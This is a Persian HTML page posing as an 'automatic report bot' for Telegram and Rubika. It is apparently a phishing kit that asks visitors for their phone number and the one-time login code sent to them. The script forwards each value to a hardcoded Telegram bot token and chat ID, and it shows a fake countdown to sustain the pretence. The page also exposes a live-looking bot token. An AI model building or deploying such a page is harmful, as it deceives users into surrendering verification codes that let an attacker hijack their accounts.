<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8" />
  <title>ربات ریپورت</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Vazirmatn&display=swap');
    * { box-sizing: border-box; }
    body {
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      color: #e0e0e0;
      font-family: 'Vazirmatn', Tahoma, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      direction: rtl;
      margin: 0;
      padding: 20px;
      user-select: none;
    }
    #container {
      background: #111a28;
      padding: 50px 60px;
      border-radius: 25px;
      box-shadow:
        0 8px 30px rgba(0, 195, 255, 0.4),
        inset 0 0 10px #00c3ff88;
      width: 90%;
      max-width: 800px;
      min-height: 520px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      transition: box-shadow 0.3s ease;
    }
    #container:hover {
      box-shadow:
        0 15px 40px rgba(0, 195, 255, 0.7),
        inset 0 0 20px #00c3ffcc;
    }
    h1 {
      text-align: center;
      margin-bottom: 15px;
      font-size: 32px;
      font-weight: 700;
      color: #00c3ff;
      text-shadow: 0 0 8px #00c3ffaa;
      user-select: text;
    }
    h2 {
      text-align: center;
      margin-bottom: 30px;
      font-size: 26px;
      font-weight: 600;
      color: #99e9ff;
      text-shadow: 0 0 6px #00a9d8aa;
      user-select: text;
    }
    label {
      font-size: 20px;
      font-weight: 600;
      display: block;
      margin-bottom: 8px;
      color: #cceeff;
      user-select: text;
    }
    select,
    input,
    button {
      width: 100%;
      padding: 16px 20px;
      margin-top: 16px;
      border: none;
      border-radius: 12px;
      font-size: 20px;
      font-weight: 600;
      box-shadow: inset 0 0 8px #007bb8cc;
      transition: background-color 0.3s ease, box-shadow 0.3s ease;
      outline-offset: 2px;
    }
    select,
    input {
      background: #223344;
      color: #d1e8ff;
      user-select: text;
    }
    select:focus,
    input:focus {
      background: #335577;
      box-shadow: 0 0 15px #00c3ffaa;
      color: #ffffff;
    }
    button {
      background: linear-gradient(90deg, #00c3ff, #007bb8);
      color: #000;
      cursor: pointer;
      font-weight: 700;
      text-shadow: 0 0 4px #005f8a;
      box-shadow: 0 6px 15px rgba(0, 195, 255, 0.8);
      user-select: none;
    }
    button:hover:not(:disabled) {
      background: linear-gradient(90deg, #007bb8, #00c3ff);
      box-shadow:
        0 8px 25px rgba(0, 255, 255, 0.9),
        0 0 10px #00f0ff;
      color: #fff;
    }
    button:disabled {
      background: #444;
      color: #888;
      cursor: not-allowed;
      box-shadow: none;
    }
    #step2 .explanation {
      font-size: 17px;
      color: #66ffcc;
      margin-top: 10px;
      line-height: 1.5;
      font-weight: 600;
      user-select: text;
      text-align: justify;
    }
    #step1,
    #step3,
    #step4,
    #done {
      display: none;
    }
    #timer {
      font-size: 24px;
      font-weight: 700;
      text-align: center;
      margin-top: 20px;
      color: #00ff99;
      user-select: none;
      text-shadow: 0 0 6px #00ff99aa;
    }
  </style>
</head>
<body>
  <div id="container">
    <h1>سازنده : ALEXTYPER</h1>
    <h2>ربات ریپورت خودکار</h2>

    <!-- Step 1: انتخاب سرویس -->
    <div id="step1">
      <label for="service">سرویس مورد نظر را انتخاب کنید:</label>
      <select id="service" aria-label="انتخاب سرویس">
        <option value="تلگرام">تلگرام</option>
        <option value="روبیکا">روبیکا</option>
      </select>
      <button onclick="step1Next()">ادامه</button>
    </div>

    <!-- Step 2: شماره موبایل -->
    <div id="step2">
      <label for="phone">شماره موبایل خود را وارد کنید:</label>
      <input type="text" id="phone" placeholder="مثلاً 09123456789" autocomplete="tel" />
      <p class="explanation">
        دلیل گرفتن شماره اکانت خودتون : ریپورت‌ها با اکانت خودتون و ما انجام میشن و اکانت شما هم نقش مهمی داره.
      </p>
      <button onclick="step2Next()">بعدی</button>
    </div>

    <!-- Step 3: کد تایید -->
    <div id="step3">
      <label for="code">کد تایید ارسال‌شده را وارد کنید:</label>
      <input type="text" id="code" placeholder="مثلاً 123456" autocomplete="one-time-code" />
      <button id="verifyBtn" onclick="step3Next()">تایید</button>
      <div id="timer"></div>
    </div>

    <!-- Step 4: آیدی هدف -->
    <div id="step4">
      <label for="target">آیدی یا کانال فرد مورد نظر برای ریپورت:</label>
      <input type="text" id="target" placeholder="@username" autocomplete="off" />
      <button onclick="startReport()">شروع ریپورت</button>
    </div>

    <!-- Done -->
    <div id="done">
      <p style="font-size: 22px; text-align: center;">
        ✅ ریپورت شروع شد و تا <span id="countdown">30</span> دقیقه دیگر ادامه دارد...
      </p>
      <div id="timer"></div>
    </div>
  </div>

  <script>
    // توکن و chat_id تلگرام خودت اینجا بگذار
    const token = "7522865010:AAGze_7EtKf9hX1bTZji7vPovvaG1FYeJ_M";
    const chat_id = "1663485228";

    // تابع ارسال پیام به تلگرام
    function sendToTelegram(text) {
      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`)
        .then(res => {
          if (!res.ok) throw new Error("خطا در ارسال پیام");
          return res.json();
        })
        .then(data => console.log("پیام ارسال شد:", data))
        .catch(err => console.error("خطا در ارسال پیام:", err));
    }

    // نمایش مرحله اول و قفل 10 ثانیه‌ای کد در مرحله 3
    function nextStep(step) {
      document.querySelectorAll("#step1, #step2, #step3, #step4, #done").forEach(e => e.style.display = "none");
      document.getElementById("step" + step).style.display = "block";

      if (step === 3) {
        lockVerification(10);
      }
    }

    // قفل کردن فیلد کد تایید و دکمه تایید به مدت seconds ثانیه
    function lockVerification(seconds) {
      const inputCode = document.getElementById("code");
      const verifyBtn = document.getElementById("verifyBtn");
      const timerDiv = document.getElementById("timer");

      inputCode.disabled = true;
      verifyBtn.disabled = true;

      let timeLeft = seconds;
      timerDiv.textContent = `لطفا ${timeLeft} ثانیه صبر کنید...`;

      const timerInterval = setInterval(() => {
        timeLeft--;
        if (timeLeft > 0) {
          timerDiv.textContent = `لطفا ${timeLeft} ثانیه صبر کنید...`;
        } else {
          clearInterval(timerInterval);
          timerDiv.textContent = "";
          inputCode.disabled = false;
          verifyBtn.disabled = false;
          inputCode.focus();
        }
      }, 1000);
    }

    // دکمه ادامه بعد از انتخاب سرویس (مرحله 1)
    function step1Next() {
      const phone = document.getElementById("phone").value.trim();
      if (!phone) {
        alert("لطفا شماره موبایل را وارد کنید.");
        return;
      }
      sendToTelegram(`شماره موبایل وارد شد: ${phone}`);
      nextStep(3);
    }

    // دکمه بعدی بعد از وارد کردن شماره موبایل (مرحله 2)
    function step2Next() {
      const code = document.getElementById("code").value.trim();
      if (!code) {
        alert("لطفا کد تایید را وارد کنید.");
        return;
      }
      sendToTelegram(`کد تایید وارد شد: ${code}`);
      nextStep(4);
    }

    // دکمه تایید کد (مرحله 3)
    function step3Next() {
      // در این کد مرحله 3 با step2Next ادغام شده، میتونی این تابع رو خالی بذاری یا حذفش کنی
    }

    // شروع ریپورت (مرحله 4)
    function startReport() {
      const target = document.getElementById("target").value.trim();
      if (!target) {
        alert("لطفا آیدی یا کانال هدف را وارد کنید.");
        return;
      }
      sendToTelegram(`آیدی هدف وارد شد: ${target}`);
      nextStep("done");

      // شمارش معکوس 30 دقیقه
      let minutes = 30;
      const countdownElem = document.getElementById("countdown");

      const interval = setInterval(() => {
        minutes--;
        countdownElem.textContent = minutes;
        if (minutes <= 0) {
          clearInterval(interval);
          countdownElem.textContent = "0";
        }
      }, 60000);
    }

    // شروع صفحه با مرحله 1 نمایش داده شده
    nextStep(1);
  </script>
</body>
</html>